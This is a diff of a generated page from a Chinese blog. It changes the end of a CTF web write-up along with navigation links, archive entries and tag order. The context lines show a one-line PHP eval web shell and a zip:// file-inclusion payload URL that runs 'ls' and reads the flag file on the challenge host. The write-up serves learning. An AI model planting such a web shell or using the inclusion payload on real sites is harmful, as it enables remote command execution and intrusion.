@@ -438,7 +438,7 @@ height:50vh;
 <p>先检查地址是否有效，然后利用之前传的后门进行命令执行。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>最后的 payload 如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> test.png%23test&amp;a=echo%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> test.png%23test&amp;a=<span class="built_in">echo</span>%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span></span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure>
 <p>然后 cat flag</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.198</span>.<span class="number">29.45</span>:<span class="number">30117</span>/?page=zip://uP<span class="number">1</span>O<span class="number">4</span>Ds/Ah<span class="number">86</span>F<span class="number">1</span>AZxgsLc<span class="number">8</span>UUjkHPZRKMoCM<span class="number">3</span>XUdT_test.png<span class="symbol">%23</span>test/test&amp;a=echo<span class="symbol">%20</span>system(<span class="symbol">%27</span>cat<span class="symbol">%20</span>./flag-Ed<span class="keyword">i98</span>vJF<span class="number">8</span>hnIp.txt<span class="symbol">%27</span>)<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">xctf&#123;3fbbe15371c9cd42ec1a698d7660849a&#125;</span></span><br></pre></td></tr></table></figure>
     </article>
@@ -457,7 +457,7 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2019/01/02/POJ-2352-Stars【树状数组】/" title="POJ-2352 Stars【树状数组】">
+                <a href="/2019/01/02/POJ-2352-Stars[树状数组]/" title="POJ-2352 Stars【树状数组】">
                     <div class="nextTitle">POJ-2352 Stars【树状数组】</div>
                 </a>
             
@@ -465,8 +465,8 @@ height:50vh;
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2018/12/08/Please-don't-stop-rua-233333/" title="Please don't stop rua 233333">
-                    <div class="prevTitle">Please don't stop rua 233333</div>
+                <a href="/2018/12/28/优雅实现哈夫曼编码/" title="优雅实现哈夫曼编码">
+                    <div class="prevTitle">优雅实现哈夫曼编码</div>
                 </a>
             
         </li>
@@ -810,9 +810,85 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 17
+        Total : 21
         </div>
         <!-- search  -->
         
@@ -853,7 +929,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars【树状数组】/">POJ-2352 Stars【树状数组】</a>
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars[树状数组]/">POJ-2352 Stars【树状数组】</a>
         </li>
     
     
@@ -868,6 +944,11 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-guess/">2017 NJCTF web guess</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span><a class="archive-post-title" href="/2018/12/28/优雅实现哈夫曼编码/">优雅实现哈夫曼编码</a>
         </li>
     
     
@@ -893,6 +974,21 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2018/11/23/漏洞练习平台及工具/">漏洞练习平台及工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/ACM-常用小-Trick/">ACM 常用小 Trick</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题[BFS]/">POJ-3984-迷宫问题[BFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ-1321-棋盘问题[DFS]</a>
         </li>
     
     
@@ -927,17 +1023,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
-    
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
-        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
     
-        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="爬虫"><span class="iconfont-archer">&#xe606;</span>爬虫</span>
     
